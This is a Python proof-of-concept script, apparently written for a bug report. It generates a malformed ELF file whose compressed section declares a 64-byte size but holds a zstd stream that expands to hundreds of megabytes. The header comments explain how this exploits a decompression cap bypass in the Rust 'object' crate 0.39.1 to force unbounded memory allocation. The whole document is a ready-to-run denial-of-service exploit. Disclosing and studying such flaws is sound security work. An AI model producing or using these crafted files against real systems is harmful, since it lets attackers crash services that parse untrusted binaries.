#!/usr/bin/env python3
# PoC: object 0.39.1 Zstd decompression cap bypass (src/read/mod.rs, CompressedData::decompress).
# The decompress() reserves `try_reserve_exact(self.uncompressed_size)` (attacker ch_size), but the
# Zstandard branch calls `decoder.read_to_end(&mut decompressed)` which grows the Vec to the ACTUAL
# decoded length, ignoring the reservation; the `size != decompressed.len()` check runs only AFTER.
# The Zlib branch (flate2 decompress_vec) honors the cap — so this is an inconsistency defect, not
# by-design. A tiny ELF declaring ch_size=64 but carrying a large-expanding zstd stream makes
# `Section::uncompressed_data()` allocate unbounded (→ OOM at scale).
import struct, os, sys, subprocess
mb = int(sys.argv[2]) if len(sys.argv) > 2 else 200
raw = b"\x00" * (mb*1024*1024)
try:
    import zstandard as zstd; frame = zstd.ZstdCompressor(level=1).compress(raw)
except Exception:
    frame = subprocess.run(["zstd","-1","-c"], input=raw, capture_output=True).stdout
chdr = struct.pack("<IIQQ", 2, 0, 64, 1)                       # ch_type=ZSTD, ch_size=64 (the lie)
secdata = chdr + frame
shstr = b"\x00.z\x00.shstrtab\x00"
ehsize, shentsize, shnum = 64, 64, 3
off_secdata = ehsize; off_shstr = off_secdata + len(secdata); off_shdrs = off_shstr + len(shstr)
def shdr(name,typ,flags,off,size,align=1):
    return struct.pack("<IIQQQQIIQQ", name,typ,flags,0,off,size,0,0,align,0)
sh0  = shdr(0,0,0,0,0)
sh_z = shdr(1, 1, 0x2|0x800, off_secdata, len(secdata))        # SHT_PROGBITS, SHF_ALLOC|SHF_COMPRESSED
sh_sh= shdr(shstr.index(b".shstrtab"), 3, 0, off_shstr, len(shstr))
ehdr = b"\x7fELF"+bytes([2,1,1,0])+b"\x00"*8 + struct.pack("<HHIQQQIHHHHHH",1,62,1,0,0,off_shdrs,0,ehsize,0,0,shentsize,shnum,2)
elf = ehdr + secdata + shstr + sh0 + sh_z + sh_sh
p = sys.argv[1] if len(sys.argv) > 1 else "poc.elf"
open(p,"wb").write(elf); print(f"wrote {p} ({len(elf)} B); declares ch_size=64, zstd expands to {mb}MB")
